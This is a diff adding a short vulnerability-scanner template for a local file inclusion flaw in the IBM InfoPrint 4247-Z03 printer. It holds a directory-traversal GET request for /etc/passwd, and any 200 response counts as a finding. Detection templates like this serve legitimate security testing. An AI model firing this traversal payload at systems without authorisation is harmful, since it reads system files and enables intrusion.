@@ -1,0 +1,22 @@
+id: ibm-infoprint-lfi
+brief:
+    title: IBM InfoPrint 4247-Z03 Impact Matrix Printer - Local File Inclusion
+    by: harshbothra_
+    level: high
+    about: IBM InfoPrint 4247-Z03 Impact Matrix Printer is subject to local file inclusion.
+    label:
+        - matrix
+        - printer
+        - edb
+        - ibm
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/./../../../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
